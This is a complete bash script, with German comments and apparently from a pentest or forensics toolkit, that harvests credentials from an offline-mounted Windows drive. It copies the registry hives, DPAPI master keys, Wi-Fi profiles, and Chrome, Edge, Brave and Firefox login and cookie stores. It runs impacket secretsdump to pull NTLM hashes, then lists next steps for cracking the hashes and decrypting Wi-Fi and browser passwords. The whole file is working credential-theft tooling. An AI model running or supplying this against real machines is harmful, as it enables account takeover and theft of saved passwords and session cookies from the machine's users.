#!/usr/bin/env bash
# dump-windows-creds.sh - alle Credential-Stores vom offline Windows extrahieren
# SAM+SYSTEM -> NTLM-Hashes, SECURITY -> LSA-Secrets, NTDS.dit falls AD
set -euo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
# shellcheck source=../lib/logging.sh
source "$TOOLKIT/scripts/lib/logging.sh"
# shellcheck source=../lib/auth_check.sh
source "$TOOLKIT/scripts/lib/auth_check.sh"

LAPTOP_ID="${1:-}"
WIN="${2:-}"
[[ -z "$LAPTOP_ID" || -z "$WIN" ]] && {
    echo "Usage: $0 <laptop-id> <windows-mount>"
    exit 1
}
require_auth "$LAPTOP_ID"

CONFIG="$WIN/Windows/System32/config"
[[ -d "$CONFIG" ]] || { log_err "Kein Windows-System unter $WIN"; exit 1; }

outdir="$TOOLKIT/output/laptop-extract/${LAPTOP_ID}-creds-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$outdir/hives" "$outdir/dpapi" "$outdir/wifi" "$outdir/parsed"

log_info "Sichere Registry-Hives"
for h in SAM SYSTEM SECURITY SOFTWARE DEFAULT; do
    [[ -f "$CONFIG/$h" ]] && cp "$CONFIG/$h" "$outdir/hives/$h" && log_ok "$h"
done

# User-Hives (NTUSER.dat)
for u in "$WIN/Users"/*; do
    [[ -d "$u" ]] || continue
    user="$(basename "$u")"
    case "$user" in "All Users"|"Default"|"Default User"|"Public") continue ;; esac
    if [[ -f "$u/NTUSER.DAT" ]]; then
        cp "$u/NTUSER.DAT" "$outdir/hives/NTUSER-${user}.DAT"
        log_ok "NTUSER fuer $user"
    fi
done

# DPAPI Master Keys (fuer Chrome/Edge-Passwoerter, WLAN-Profile entschluesseln)
for u in "$WIN/Users"/*; do
    [[ -d "$u" ]] || continue
    user="$(basename "$u")"
    case "$user" in "All Users"|"Default"|"Default User"|"Public") continue ;; esac
    proto="$u/AppData/Roaming/Microsoft/Protect"
    if [[ -d "$proto" ]]; then
        mkdir -p "$outdir/dpapi/$user"
        cp -r "$proto" "$outdir/dpapi/$user/" 2>/dev/null && log_ok "DPAPI ($user)"
    fi
done

# System DPAPI Keys
sysproto="$WIN/Windows/System32/Microsoft/Protect"
if [[ -d "$sysproto" ]]; then
    cp -r "$sysproto" "$outdir/dpapi/SYSTEM" && log_ok "DPAPI SYSTEM"
fi

# WLAN-Profile (XML, mit verschluesseltem Key)
wlan="$WIN/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces"
if [[ -d "$wlan" ]]; then
    find "$wlan" -name '*.xml' -exec cp {} "$outdir/wifi/" \;
    log_ok "$(ls "$outdir/wifi" | wc -l) WLAN-Profile (XML, key verschluesselt)"
fi

# Browser-Datenbanken
for u in "$WIN/Users"/*; do
    [[ -d "$u" ]] || continue
    user="$(basename "$u")"
    case "$user" in "All Users"|"Default"|"Default User"|"Public") continue ;; esac
    udst="$outdir/browser/$user"
    mkdir -p "$udst"

    for chrome_path in \
        "AppData/Local/Google/Chrome/User Data/Default/Login Data" \
        "AppData/Local/Google/Chrome/User Data/Default/Cookies" \
        "AppData/Local/Google/Chrome/User Data/Default/Network/Cookies" \
        "AppData/Local/Google/Chrome/User Data/Local State" \
        "AppData/Local/Microsoft/Edge/User Data/Default/Login Data" \
        "AppData/Local/Microsoft/Edge/User Data/Local State" \
        "AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data"; do
        src="$u/$chrome_path"
        if [[ -f "$src" ]]; then
            base="$(basename "$chrome_path")"
            dir="$(echo "$chrome_path" | tr '/\\ ' '___')"
            cp "$src" "$udst/${dir}" 2>/dev/null && log_ok "$user: $chrome_path"
        fi
    done

    # Firefox: ganze Profil-Ordner
    ff="$u/AppData/Roaming/Mozilla/Firefox/Profiles"
    if [[ -d "$ff" ]]; then
        cp -r "$ff" "$udst/firefox-profiles" 2>/dev/null && log_ok "$user: Firefox-Profile"
    fi
done

# Versuche NTLM-Hashes mit secretsdump.py zu extrahieren (impacket)
if command -v secretsdump.py >/dev/null 2>&1 || command -v impacket-secretsdump >/dev/null 2>&1; then
    SDC=secretsdump.py
    command -v impacket-secretsdump >/dev/null 2>&1 && SDC=impacket-secretsdump
    log_info "Extrahiere NTLM-Hashes mit $SDC"
    "$SDC" -sam "$outdir/hives/SAM" -system "$outdir/hives/SYSTEM" \
                  -security "$outdir/hives/SECURITY" LOCAL \
        2>&1 | tee "$outdir/parsed/ntlm-hashes.txt" || log_warn "secretsdump exit non-zero"
    log_ok "Hashes in $outdir/parsed/ntlm-hashes.txt"
else
    log_warn "impacket-secretsdump nicht installiert"
    log_warn "  sudo apt install impacket-scripts  oder  pipx install impacket"
fi

du -sh "$outdir"
log_ok "Komplett: $outdir"
echo
echo "Naechste Schritte:"
echo "  - NTLM-Hashes cracken: $TOOLKIT/scripts/hashcrack/crack-ntlm.sh $outdir/parsed/ntlm-hashes.txt"
echo "  - WLAN-Keys entschluesseln: $TOOLKIT/scripts/laptop-extract/decrypt-wifi-keys.sh '$LAPTOP_ID' '$outdir'"
echo "  - Browser-Passwoerter via DPAPI: $TOOLKIT/scripts/laptop-extract/decrypt-browser-creds.sh '$LAPTOP_ID' '$outdir'"
